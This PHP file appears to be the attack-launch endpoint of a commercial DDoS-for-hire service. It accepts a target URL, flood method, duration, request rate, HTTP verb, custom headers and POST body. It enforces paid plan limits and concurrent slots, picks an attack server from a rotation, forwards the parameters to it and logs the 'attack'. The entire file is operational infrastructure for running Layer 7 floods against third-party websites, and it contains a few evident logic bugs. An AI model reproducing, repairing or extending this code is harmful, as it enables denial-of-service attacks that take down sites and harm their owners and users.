<?php
ignore_user_abort(true);
set_time_limit(0);
header("Content-Type: application/json");

if (!isset($_GET["address"]) ||
    !isset($_GET["method"]) || !isset($_GET["duration"])) {
    die(json_encode([
        "success" => false,
        "error" => 'Please verify all fields.',
    ]));
}

require_once '../includes/db.php';
require_once '../includes/init.php';

if (isset($info) && $info["l7"] == 1){
    die(json_encode([
        "success" => false,
        "error" => 'Layer7 disabled!',
    ]));
}

$target = $_GET['address'];
$time = intval($_GET['duration']);
$method = $_GET['method'];
$mode = "GET";

$rate = 64;
$custom_header = null;
$post = null;
$api_key = null;

if (isset($_GET['key'])) {
    $api_key = $_GET['key'];
}

if (isset($_GET['custom_header'])) {
    $custom_header = $_GET['custom_header'];
}

if (isset($_GET['post'])) {
    $post = $_GET['post'];
}

if (isset($_GET["mode"])) {
    $mode = $_GET['mode'];
}
if (isset($_GET['rate'])) {
    $rate = $_GET['rate'];
}
if ($rate > 64) {
    die(json_encode([
        "success" => false,
        "error" => 'Please enter a value inferior than 65 requests.',
    ]));

}


if (empty($target) || empty($time) || empty($method)) {
    die(json_encode([
        "success" => false,
        "error" => 'Please verify all fields.',
    ]));
}


if ($time < 30) {
    die(json_encode([
        "success" => false,
        "error" => 'The minimum accepted time is 30 seconds.',
    ]));
}

if (!isset($sql)) {
    die(json_encode([
        "success" => false,
        "error" => 'No SQL Detected.',
    ]));
}
$ustimeapi = null;
$us = null;

if (!empty($api_key)) {
    $api_plus = $sql->prepare("SELECT * FROM `apiplus` WHERE `apikey` = :key");
    $api_plus->execute([':key' => $api_key]);
    $api_plus = $api_plus->fetch(PDO::FETCH_ASSOC);

    if (empty($api_plus)) {
        die(json_encode([
            "success" => false,
            "error" => 'Your key or your user id is invalid.',
        ]));
    }

    $us = $api_plus["user"];
    $ustimeapi = $api_plus['timeapi'];

    $plansql = $sql->prepare("SELECT `users`.*,`plans`.`name`, `plans`.`mbt`, `plans`.`nbr`, `plans`.`code`, `plans`.`api` FROM `users`, `plans` WHERE `plans`.`ID` = `users`.`membership` AND `users`.`ID` = :id LIMIT 1");
    $plansql->execute(array(":id" => $us));
    $userInfo = $plansql->fetch(PDO::FETCH_ASSOC);

    if (!$userInfo["api"]) {
        die(json_encode([
            "success" => false,
            "error" => "You don't have access to usage api!",
        ]));
    }

} else {
    include '../includes/configuration.php';
    include '../includes/extra.php';
    $us = $_SESSION["ID"];

    if (!isset($_GET["__csrf"]) || $_GET["__csrf"] != $_SESSION['token']) {
        die(json_encode([
            "success" => false,
            "error" => 'Invalid request.',
        ]));
    }

}

if (empty($us)) {
    die(json_encode([
        "success" => false,
        "error" => 'Please put your api key.',
    ]));
}

$SQLGetInfo = $sql->prepare("SELECT * FROM `users` WHERE `ID` = :id");
$SQLGetInfo->execute(array(':id' => $us));
$usInf = $SQLGetInfo->fetch(PDO::FETCH_ASSOC);

$usname = $usInf['username'];
$us_id = $usInf['ID'];
$us_concu = $usInf['concu'];

$SQLGetInfo = $sql->prepare("SELECT `classement` FROM `methodes` WHERE `method` = :method");
$SQLGetInfo->execute(array(':method' => htmlspecialchars($method)));
$type = $SQLGetInfo->fetchColumn();

if ($type !== '7') {
    die(json_encode([
        "success" => false,
        "error" => 'this method is unavailable on layer7',
    ]));
}

$countRunning = $sql->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND
                                  `time` + `date` > UNIX_TIMESTAMP()");
$countRunning->execute(array(':username' => $usname));
$countRunning = $countRunning->fetchColumn();

$SQLGetTime = $sql->prepare("SELECT `plans`.`nbr` FROM `plans` LEFT JOIN `users` ON
    `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
$SQLGetTime->execute(array(':id' => $us_id));
$concur = $SQLGetTime->fetchColumn();

if ($countRunning >= ($concur + $us_concu)) {
    die(json_encode([
        "success" => false,
        "error" => 'Your has run out of slots, please wait!.',
    ]));
}

$SQLCheckBlacklist = $sql->prepare("SELECT note FROM `blacklist` WHERE `IP` = :host");
$SQLCheckBlacklist->execute([':host' => trim(parse_url($target)["host"])]);
$blacklistnote = $SQLCheckBlacklist->fetchColumn();
if (!empty($blacklistnote)) {
    die(json_encode([
        "success" => false,
        "error" => sprintf("Target Blacklisted, Reason: %s", htmlspecialchars($blacklistnote)),
    ]));
}

if (empty($ustimeapi)) {
    $plansql = $sql->prepare("SELECT `users`.*,`plans`.`name`, `plans`.`mbt`, `plans`.`nbr`, `plans`.`code`, `plans`.`api` FROM `users`, `plans` WHERE `plans`.`ID` = `users`.`membership` AND `users`.`ID` = :id LIMIT 1");
    $plansql->execute(array(":id" => $_SESSION['ID']));
    $userInfo = $plansql->fetch(PDO::FETCH_ASSOC);

    $ustimeapi = $usInf["secs"] + $userInfo['mbt'];
}

if ($time > $ustimeapi) {
    die(json_encode([
        "success" => false,
        "error" => 'You have exceeded the time allowed!',
    ]));
}

if (!filter_var($target, FILTER_VALIDATE_URL)) {
    die(json_encode([
        "success" => false,
        "error" => 'The request could not succeed, please insert an URL Website.',
    ]));
}

$servers = [];
$ServersRotation = $sql->query("SELECT * FROM `serveurs` WHERE `type` = 7 AND `status` = 0 ORDER BY
                                                               ABS(`date`) LIMIT 1;");

if ($ServersRotation->rowCount() != 0) {
    $servers = $ServersRotation->fetchAll(PDO::FETCH_ASSOC);
    $id = $servers[0]['ID'];
    $address = $servers[0]['adresse'];

    $allowed_mode = [
        'POST',
        'GET',
        'HEAD',
        'PUT',
        'DELETE',
        'PATCH'
    ];

    if (!in_array($mode, $allowed_mode)) {
        die(json_encode([
            "success" => false,
            "error" => 'Please choose a correct Request Method.',
        ]));
    }

    $SQLGetInfo = $sql->prepare("SELECT `classement` FROM `methodes` WHERE `method` = :method");
    $SQLGetInfo->execute(array(
        ':method' => htmlspecialchars($method)
    ));

    $type = $SQLGetInfo->fetchColumn();
    if ($type !== '7') {
        die(json_encode([
            "success" => false,
            "error" => 'Your method is not a required method to attack in Layer 7.',
        ]));
    }

    $checkRunningSQL = $sql->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND `time` + `date` > UNIX_TIMESTAMP()");
    $checkRunningSQL->execute(array(
        ':username' => $usname
    ));
    $countRunning = $checkRunningSQL->fetchColumn();
    $SQLGetTime = $sql->prepare("SELECT `plans`.`nbr` FROM `plans` LEFT JOIN `users` ON
    `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
    $SQLGetTime->execute(array(
        ':id' => $id
    ));
    $concur = $SQLGetTime->fetchColumn();


    $ServeurCompatible = $sql->prepare("SELECT COUNT(*) FROM `methodes` WHERE `method` = :nom");
    $ServeurCompatible->execute(array(
        ':nom' => $method
    ));

    $Verification = $ServeurCompatible->fetchColumn();
    if ($Verification == 0) {
        die(json_encode([
            "success" => false,
            "error" => 'It was not possible to start your shipment, 
            please make sure that the selected attack method is available.',
        ]));
    }

    $servers = array();
    $ServersRotation = $sql->query("SELECT * FROM `serveurs` WHERE `type` = $type AND `status` = 0 ORDER BY ABS(`date`) 
                                                               LIMIT 1;");

    if ($ServersRotation->rowCount() != 0) {
        $servers = $ServersRotation->fetchAll(PDO::FETCH_ASSOC);
        $id = $servers[0]['ID'];
        $address = $servers[0]['adresse'];

        $checkServerSQL = $sql->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND `time` + `date` > UNIX_TIMESTAMP()");
        $checkServerSQL->execute([':username' => $usname]);

        if ($countServeur = 0) {
            die(json_encode([
                "success" => false,
                "error" => 'There are no servers available to handle your attack, try later.',
            ]));
        }

        findFreeServer($sql, $id);

        API_SendRequest(str_replace("%hote%", $target,
            str_replace("%temps%", $time,
                str_replace("%type%", $method,
                    str_replace("%mode%", $mode,
                        str_replace("%rate%", $rate,
                            str_replace("%custom_header%", $custom_header,
                                str_replace("%post%", $post,
                                    str_replace("%user%", $usname, $address)))))))));

        $insertLogSQL = $sql->prepare("INSERT INTO `logs` VALUES(NULL, :user, :ip, :port, :time, :timerst, :method, :serveur, :note, '', UNIX_TIMESTAMP())");
        $insertLogSQL->execute([
            ':user' => $usname,
            ':ip' => $target,
            ':port' => '0',
            ':time' => $time,
            ':timerst' => $time,
            ':method' => $method,
            ':serveur' => $id,
            ':note' => sprintf("Mode: %s | Rate: %s | Header: %s | PostData: %s",
                empty($mode) ? "GET" : $mode,
                empty($rate) ? "64" : $rate,
                empty($custom_header) ? "Empty" : $custom_header,
                empty($post) ? "Empty" : $post)
        ]);

        $updateServer = $sql->prepare("UPDATE `serveurs` SET `date` = UNIX_TIMESTAMP(NOW()) WHERE `ID` = :id");
        $updateServer->execute(array(
            ':id' => $id
        ));

        if (!empty($api_key)) {
            $insertAPISQL = $sql->prepare("INSERT INTO `api_historique` VALUES(NULL, :clef, :username, :value, :type, :ip, UNIX_TIMESTAMP())");
            $insertAPISQL->execute([':clef' => $api_key, ':username' => $usname, ':value' => $method, ':type' => 'L4', ':ip' => $target]);
        }
        die(json_encode([
            "success" => true,
            "error" => '',
        ]));
    }

}

